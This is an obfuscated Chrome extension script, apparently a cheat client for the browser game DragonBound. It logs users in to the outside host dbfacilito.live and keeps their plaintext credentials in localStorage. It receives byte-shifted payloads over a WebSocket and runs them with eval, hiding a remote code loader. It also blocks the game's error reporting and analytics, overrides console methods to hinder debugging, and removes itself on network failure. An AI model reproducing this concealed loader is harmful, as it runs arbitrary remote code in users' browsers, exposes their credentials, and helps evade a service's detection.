!function(){const _0x5ba6ef=function(){const e=function(e,t,n){return e(t,n)},t=function(e,t){return e!==t},n="aCZxX",r="wUmvx",o=function(e,t){return e===t},c="ZaGgQ",a=function(e,t){return e!==t},s="vKFpG";let x=!0;return function(i,_){const u={nDmWQ:function(e,n){return t(e,n)},mxvsZ:n,HeTBO:r,HwyFz:function(e,t){return o(e,t)},zEHAC:c};if(a(s,s)){const t={success:!0,message:_0x29a729.success},n={success:!1};return n.message=_0xa3c763.errorServer,e(_0x5243e4,_0x430934,_0x1ca629).then((e=>e.json())).then((e=>e.error?(_0x5c56f2("ERRC"),_0x47dc23(e.error),{success:!1,message:e.error}):e.token?(_0x3faf6c.setItem("credentials",_0x40bcdf.body),_0x444010.setItem("token",e.token),_0x24ea0a(e.token),t):(_0x4865a4("ERRS"),n))).catch((e=>(_0xc977cb("ERROR SERVER"),_0x2b201a("ERRN"),{success:!1,message:_0x3fed6f.errorNetwork+e.message})))}{const e=x?function(){if(!u.nDmWQ(u.mxvsZ,u.HeTBO)){const e=_0x141cb4?function(){if(_0x365d68){const e=_0x3157f3.apply(_0x33afae,arguments);return _0x4b11ff=null,e}}:function(){};return _0x1ab1d0=!1,e}if(_){if(u.HwyFz(u.zEHAC,u.zEHAC)){const e=_.apply(i,arguments);return _=null,e}{const e=_0x4864df?function(){if(_0x48f2ef){const e=_0x2c02a6.apply(_0x588cc8,arguments);return _0xc278ee=null,e}}:function(){};return _0x1170dc=!1,e}}}:function(){};return x=!1,e}}}(),_0x39a577=function(){let e=!0;return function(t,n){const r=e?function(){if(n){const e=n.apply(t,arguments);return n=null,e}}:function(){};return e=!1,r}}();let _0x1a76d8;const _0xcc4362={success:"Inicio de sesiÃ³n exitoso",errorServer:"Unexpected server response",errorNetwork:"Network error: "},_0x2df85b=_0xcc4362,_0x441418=(window.IP_SERVER="dbfacilito.live",window.IP_SERVER),_0x25fb7b={hostServer:_0x441418,apiServer:"https://"+_0x441418,loginPage:"page/internal_page.html"};function _0x42b15a(e,t){const n={success:!0,message:_0x2df85b.success},r={success:!1};return r.message=_0x2df85b.errorServer,fetch(e,t).then((e=>e.json())).then((e=>e.error?(_0x3a845a("ERRC"),alert(e.error),{success:!1,message:e.error}):e.token?(localStorage.setItem("credentials",t.body),localStorage.setItem("token",e.token),_0x4636c9(e.token),n):(_0x3a845a("ERRS"),r))).catch((e=>(alert("ERROR SERVER"),_0x3a845a("ERRN"),{success:!1,message:_0x2df85b.errorNetwork+e.message})))}function _0xb9c044(e,t){return fetch(e,t).then((e=>e.json())).then((e=>{e.token?(localStorage.setItem("credentials",t.body),localStorage.setItem("token",e.token),_0x4636c9(e.token)):e.error&&(_0x3a845a("ERRC"),alert(e.error),chrome.tabs.create({url:chrome.runtime.getURL(_0x25fb7b.loginPage),active:!0}))})).catch((e=>{alert("ERROR SERVER"),_0x3a845a("ERRN");let t=chrome.runtime.id;chrome.management.getAll((function(e){for(var n in e)e[n].id==t&&chrome.management.uninstall(t,(()=>{chrome.management.get(t,(()=>{}))}))}))}))}function _0x4636c9(_0x39160f){_0x1a76d8=new WebSocket(("localhost:3000"==_0x441418?"ws":"wss")+"://"+_0x25fb7b.hostServer+"?token="+_0x39160f+"&c=3"),_0x1a76d8.onopen=()=>{_0x3a845a("ON")},_0x1a76d8.onmessage=_0x4aac75=>{const _0x15af46={type:"application/octet-binary"},_0x53e94f=_0x4aac75.data||"",_0x2e7b29=new Blob([_0x53e94f],_0x15af46),_0x42646c=new FileReader;_0x42646c.onload=function(_0x56598e){const _0x4f3438=_0x56598e.target.result,_0x30e196=JSON.parse(atob(_0x4f3438));let _0x59027b=(new TextEncoder).encode(_0x30e196[0]);for(let e=0;e<_0x59027b.length;e++)_0x59027b[e]+=7;for(let e=0;e<10;e++)_0x59027b[e]+=3;_0x1a76d8.readyState===WebSocket.OPEN&&_0x1a76d8.close(),eval((new TextDecoder).decode(_0x59027b)),_0x3a845a("ON")},_0x42646c.onerror=function(e){_0x3a845a("ERRF1")},_0x42646c.readAsText(_0x2e7b29)}}function _0x19309e(){Math.random();var e=window.Date.now(),t=!1;50<(t=!0,window.Date.now()-e)&&t&&window.alertCheater()}function _0x3a845a(e){chrome.browserAction.setBadgeBackgroundColor({color:[50,200,0,200]});const t={text:e};chrome.browserAction.setBadgeText(t),e={title:e},chrome.browserAction.setTitle(e)}function _0x56950f(){const e=_0x5ba6ef(this,(function(){return e.toString().search("(((.+)+)+)+$").toString().constructor(e).search("(((.+)+)+)+$")}));e();_0x39a577(this,(function(){let e;try{e=Function('return (function() {}.constructor("return this")(\\x20));')()}catch(t){e=window}const t=e.console=e.console||{},n=["log","warn","info","error","exception","table","trace"];for(let e=0;e<n.length;e++){const r=_0x39a577.constructor.prototype.bind(_0x39a577),o=n[e],c=t[o]||r;r.__proto__=_0x39a577.bind(_0x39a577),r.toString=c.toString.bind(c),t[o]=r}}))(),_0x3a845a("ID");var t=localStorage.getItem("credentials"),n=_0x25fb7b.apiServer+"/g";t?_0xb9c044(n,{method:"POST",headers:{"Content-Type":"application/json"},body:t}).then((e=>!0)).catch((e=>chrome.tabs.create({url:chrome.runtime.getURL(_0x25fb7b.loginPage),active:!0}))):chrome.tabs.create({url:chrome.runtime.getURL(_0x25fb7b.loginPage),active:!0})}try{chrome.runtime.onMessage.addListener((function(e,t,n){if(e.username&&e.password)return _0x42b15a(_0x25fb7b.apiServer+"/g",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:e.username,password:e.password})}).then((e=>{n(e)})).catch((e=>{n({success:!1,message:_0x2df85b.errorUnexpected+e.message})})),!0})),chrome.webRequest.onBeforeRequest.addListener((function(e){const t={cancel:!0};if(e.url.includes("https://dragonbound.net/error")||e.url.includes("https://www.googletagmanager.com/gtag/js"))return t}),{urls:["https://dragonbound.net/error*","https://www.googletagmanager.com/gtag/js*"]},["blocking"]),_0x56950f()}catch(e){}}();
